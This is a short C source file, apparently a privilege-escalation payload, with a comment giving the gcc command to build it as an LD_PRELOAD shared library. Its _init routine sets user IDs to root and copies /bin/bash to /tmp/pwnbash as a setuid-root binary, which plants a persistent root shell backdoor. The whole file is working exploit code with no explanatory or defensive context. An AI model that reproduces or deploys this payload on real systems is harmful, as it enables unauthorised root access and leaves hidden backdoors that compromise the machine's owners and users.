#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("cp /bin/bash /tmp/pwnbash; chown root /tmp/pwnbash; chmod +s /tmp/pwnbash");
}

//To compile
//gcc -fPIC -shared -nostartfiles -o preload1.so preload.c
